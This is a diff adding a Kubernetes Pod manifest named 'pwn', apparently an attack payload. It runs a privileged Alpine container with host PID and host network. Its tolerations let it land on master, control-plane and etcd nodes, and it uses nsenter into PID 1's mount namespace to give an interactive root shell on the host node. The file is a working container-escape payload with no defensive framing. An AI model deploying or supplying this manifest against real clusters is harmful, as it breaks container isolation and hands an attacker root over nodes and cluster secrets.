@@ -1,0 +1,30 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwn
+spec:
+  hostPID: true
+  hostNetwork: true
+  tolerations:
+  - effect: NoSchedule
+    key: node-role.kubernetes.io/master
+  - effect: NoSchedule
+    key: node-role.kubernetes.io/controlplane
+  - effect: NoExecute
+    key: node-role.kubernetes.io/etcd
+  containers:
+  - name: alpine
+    image: alpine:3.7
+    command:
+    - nsenter
+    - "--mount=/proc/1/ns/mnt"
+    - "--"
+    - sh
+    - "-"
+    stdin: true
+    tty: true
+    resources:
+      requests:
+        cpu: 10m
+    securityContext:
+      privileged: true
